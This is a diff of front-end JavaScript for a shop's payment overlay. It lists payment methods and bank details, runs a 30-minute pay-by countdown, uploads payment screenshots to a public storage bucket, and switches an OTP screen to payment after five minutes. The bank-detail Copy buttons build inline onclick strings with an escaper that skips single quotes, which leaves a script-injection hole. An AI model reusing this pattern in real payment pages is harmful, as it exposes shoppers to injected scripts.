+  if (error || !data || !data.length) {
+    list.innerHTML = '<div class="pm-empty">No payment options configured yet.</div>';
+    return;
+  }
+
+  function getPreviewText(opt) {
+    if (opt.method === 'banktransfer') {
+      return 'Tap to view account details';
+    }
+    return opt.address;
+  }
+
+  list.innerHTML = data.map((opt, i) => `
+    <div class="pm-option-wrap">
+      <button class="pm-option" data-index="${i}" onclick="pmSelectOptionByIndex(${i})">
+        <span class="pay-icon ${opt.method}">${ICONS[opt.method] || '💳'}</span>
+        <span class="pm-option-info">
+          <span class="pm-option-name">${esc(opt.name)}</span>
+          <span class="pm-option-addr">${esc(getPreviewText(opt))}</span>
+          ${opt.description ? `<span class="pm-option-desc">${esc(opt.description)}</span>` : ''}
+        </span>
+        <svg class="pm-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+      </button>
+      ${opt.method !== 'banktransfer' ? `
+      <button class="pm-copy-btn" data-index="${i}" onclick="pmCopyInfoByIndex(${i})">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
+        </svg>
+        Copy
+      </button>` : ''}
+    </div>
+  `).join('');
+
+  // Store the raw option data so click handlers can read real values
+  // instead of interpolating them (unsafely) into onclick attribute strings.
+  window.__pmOptionsData = data;
+}
+
+window.pmSelectOptionByIndex = function(i) {
+  const opt = window.__pmOptionsData[i];
+  pmSelectOption(opt.method, opt.address, opt.name);
+};
+
+window.pmCopyInfoByIndex = function(i) {
+  const opt = window.__pmOptionsData[i];
+  pmCopyInfo(event, opt.address, opt.name);
+};
+
+
+function renderBankTransferDetails(addressJson) {
+  let details;
+  try {
+    details = JSON.parse(addressJson);
+  } catch (e) {
+    return '<p style="color:#ef4444;font-size:13px;">Bank details unavailable.</p>';
+  }
+
+  const currencies = [
+    {
+      key: 'usd',
+      title: 'United States Dollar (USD) 🇺🇸',
+      fields: [
+        { label: 'Account Number', value: details.usd?.account },
+        { label: 'Routing Number', value: details.usd?.routing }
+      ]
+    },
+    {
+      key: 'eur',
+      title: 'European Euro (EUR) 🇪🇺',
+      fields: [
+        { label: 'Account Number', value: details.eur?.account },
+        { label: 'IBAN', value: details.eur?.iban },
+        { label: 'Swift Code', value: details.eur?.swift }
+      ]
+    },
+    {
+      key: 'gbp',
+      title: 'Great Britain Pound (GBP) 🇬🇧',
+      fields: [
+        { label: 'Account Number', value: details.gbp?.account },
+        { label: 'Sort Code', value: details.gbp?.sort },
+        { label: 'Swift Code', value: details.gbp?.swift }
+      ]
+    }
+  ];
+
+  return currencies
+    .filter(c => c.fields.some(f => f.value))
+    .map(c => `
+      <div class="bt-currency-group">
+        <div class="bt-currency-title">${esc(c.title)}</div>
+        ${c.fields.filter(f => f.value).map(f => `
+          <div class="bt-detail-row">
+            <div class="bt-detail-text">
+              <span class="bt-detail-label">${esc(f.label)}</span>
+              <span class="bt-detail-value">${esc(f.value)}</span>
+            </div>
+            <button class="bt-copy-btn" onclick="pmCopyInfo(event, '${esc(f.value)}', '${esc(f.label)}')">Copy</button>
+          </div>
+        `).join('')}
+      </div>
+    `).join('');
+}
+
+
+
+
+
+window.pmCopyInfo = async function(e, address, name) {
+  e.stopPropagation();
+  const btn = e.currentTarget;
+  try {
+    await navigator.clipboard.writeText(address);
+    btn.classList.add('copied');
+    btn.innerHTML = `
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+      Copied!`;
+    setTimeout(() => {
+      btn.classList.remove('copied');
+      btn.innerHTML = `
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
+        </svg>
+        Copy`;
+    }, 2500);
+  } catch {
+    alert('Could not copy: ' + address);
+  }
+};
+
+
+ window.pmSelectOption = function(method, address, name) {
+  selectedMethod = method;
+  clearInterval(countdownTimer);
+  
+  const deadline = Date.now() + PM_TOTAL_SECONDS * 1000;
+  localStorage.setItem(PM_STORAGE_KEY, deadline);
+  
+  // ── This is the only changed line ──
+  if (method === 'banktransfer') {
+    document.getElementById('pmSelectedAddr').innerHTML = renderBankTransferDetails(address);
+  } else {
+    document.getElementById('pmSelectedAddr').textContent = address;
+  }
+
+  document.getElementById('pmDetailSection').classList.add('visible');
+  document.getElementById('pmUploadSection').classList.remove('visible');
+  document.getElementById('pmSubmitBtn').classList.remove('visible');
+  document.getElementById('pmSuccessMsg').classList.remove('visible');
+  document.getElementById('pmMadeBtn').disabled = false;
+  document.getElementById('pmAmountDue').textContent = `$${orderData.grandTotal} USD`;
+
+  document.getElementById('pmPreview').style.display = 'none';
+  document.getElementById('pmPreviewImg').src = '';
+  selectedFile = null;
+  
+  tick(deadline);
+  countdownTimer = setInterval(() => {
+    const secondsLeft = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
+    tick(deadline);
+    if (secondsLeft <= 0) {
+      clearInterval(countdownTimer);
+      localStorage.removeItem(PM_STORAGE_KEY);
+      document.getElementById('pmMadeBtn').disabled = true;
+      document.getElementById('pmCountdownTime').textContent = 'Expired';
+    }
+  }, 1000);
+  
+  document.getElementById('pmDetailSection').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+};
+
+
+
+  const PM_STORAGE_KEY = 'pmDeadline';
+const PM_TOTAL_SECONDS = 1800; // 30 min
+
+function tick(deadline) {
+  const secondsLeft = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
+
+  const m = Math.floor(secondsLeft / 60).toString().padStart(2, '0');
+  const s = (secondsLeft % 60).toString().padStart(2, '0');
+  const el = document.getElementById('pmCountdownTime');
+  const fill = document.getElementById('pmFill');
+  const urgent = secondsLeft <= 300;
+
+  el.textContent = `${m}:${s}`;
+  el.classList.toggle('urgent', urgent);
+  fill.style.width = (secondsLeft / PM_TOTAL_SECONDS * 100) + '%';
+  fill.classList.toggle('urgent', urgent);
+}
+
+
+window.addEventListener('DOMContentLoaded', () => {
+  const savedDeadline = parseInt(localStorage.getItem(PM_STORAGE_KEY), 10);
+  if (savedDeadline && !isNaN(savedDeadline) && savedDeadline > Date.now()) {
+    // Resume the countdown — you'll need to also restore method/address/name
+    // from wherever you originally stored them (e.g. sessionStorage, or re-derive from the order)
+    const deadline = savedDeadline;
+    tick(deadline);
+    countdownTimer = setInterval(() => {
+      const secondsLeft = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
+      tick(deadline);
+      if (secondsLeft <= 0) {
+        clearInterval(countdownTimer);
+        localStorage.removeItem(PM_STORAGE_KEY);
+        document.getElementById('pmMadeBtn').disabled = true;
+        document.getElementById('pmCountdownTime').textContent = 'Expired';
+      }
+    }, 1000);
+    document.getElementById('pmDetailSection').classList.add('visible');
+  }
+});
+
+
+
+  window.pmShowUpload = function() {
+    document.getElementById('pmUploadSection').classList.add('visible');
+    document.getElementById('pmMadeBtn').disabled = true;
+  };
+
+  window.pmHandleFile = function(input) {
+    const file = input.files[0];
+    if (!file) return;
+    if (file.size > 5*1024*1024) { alert('Max 5MB'); return; }
+    selectedFile = file;
+    document.getElementById('pmPreviewImg').src = URL.createObjectURL(file);
+    document.getElementById('pmPreview').style.display = 'block';
+    document.getElementById('pmSubmitBtn').classList.add('visible');
+  };
+
+  window.pmSubmitProof = async function() {
+  console.log('selectedFile:', selectedFile, 'selectedMethod:', selectedMethod);
+  
+  const btn = document.getElementById('pmSubmitBtn');
+  
+  // Validation
+  if (!selectedFile || !selectedMethod) {
+    alert('Missing file or payment method — please try again.');
+    return;
+  }
+  
+  // Disable button and show loading state
+  btn.disabled = true;
+  btn.textContent = 'Uploading…';
+  
+  try {
+    const fileName = `${selectedMethod}_${Date.now()}_${selectedFile.name}`;
+    
+    // 1. Upload file to Supabase Storage
+    const { error: upErr } = await sb.storage
+      .from('payment-proofs')
+      .upload(fileName, selectedFile, {
+        contentType: selectedFile.type,
+        upsert: true
+      });
+    
+    if (upErr) {
+      throw new Error('Upload failed: ' + upErr.message);
+    }
+    
+    // 2. Get public URL
+    const { data: urlData } = sb.storage
+      .from('payment-proofs')
+      .getPublicUrl(fileName);
+    
+    // 3. Save record to database
+    const { error: insErr } = await sb
+      .from('payment_proofs')
+      .insert({
+        method: selectedMethod,
+        screenshot_url: urlData.publicUrl,
+        // You can add more fields if needed:
+        // order_id: insertedOrderId,
+        // uploaded_at: new Date().toISOString()
+      });
+    
+    if (insErr) {
+      throw new Error('Save failed: ' + insErr.message);
+    }
+    
+    // Success flow
+    clearInterval(countdownTimer);
+    
+    document.getElementById('pmSuccessMsg').classList.add('visible');
+    document.getElementById('pmUploadSection').classList.remove('visible');
+    btn.classList.remove('visible');
+    
+    // Clear cart and redirect
+    setTimeout(() => {
+  localStorage.removeItem('cart');
+  sessionStorage.removeItem('orderData');
+  localStorage.removeItem('pmDeadline'); // clear the payment countdown
+  window.location.href = 'index.html';
+}, 4000);
+
+    
+  } catch (err) {
+    console.error(err);
+    alert(err.message || 'Something went wrong. Please try again.');
+    
+    // Reset button
+    btn.disabled = false;
+    btn.textContent = 'Submit Screenshot';
+  }
+};
+
+
+  
+
+  function esc(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+
+  const overlay = document.getElementById('overlaypayment');
+  if (overlay) {
+    new MutationObserver(() => { if (overlay.classList.contains('active')) loadOptions(); }).observe(overlay, { attributes:true, attributeFilter:['class'] });
+    if (overlay.classList.contains('active')) loadOptions();
+  }
+  
+  
+  const OTP_TIMEOUT_MS = 5 * 60 * 1000; // 5 minutes
+  let paymentTimer = null;
+
+  function showPaymentOverlay() {
+    const otpOverlay = document.getElementById("overlayOtp");
+    const paymentOverlay = document.getElementById("overlaypayment");
+
+    if (otpOverlay) otpOverlay.classList.remove("active"); // hide OTP
+    if (paymentOverlay) paymentOverlay.classList.add("active"); // show Payment
+  }
+
+  function startPaymentCountdown() {
+    if (paymentTimer) clearTimeout(paymentTimer);
+    paymentTimer = setTimeout(showPaymentOverlay, OTP_TIMEOUT_MS);
+  }
+
+  function stopPaymentCountdown() {
+    if (paymentTimer) {
+      clearTimeout(paymentTimer);
+      paymentTimer = null;
+    }
+  }
+
+  const otpOverlay = document.getElementById("overlayOtp");
+
+  if (otpOverlay) {
+    const observer = new MutationObserver(() => {
+      if (otpOverlay.classList.contains("active")) {
+        startPaymentCountdown();
+      } else {
+        stopPaymentCountdown();
+      }
+    });
+
+    observer.observe(otpOverlay, {
+      attributes: true,
+      attributeFilter: ["class"],
+    });
+
+    // Check immediately if already active on page load
+    if (otpOverlay.classList.contains("active")) {
+      startPaymentCountdown();
+    }
+  }
+})();
+
+</script>
+
+</body>
+</html>
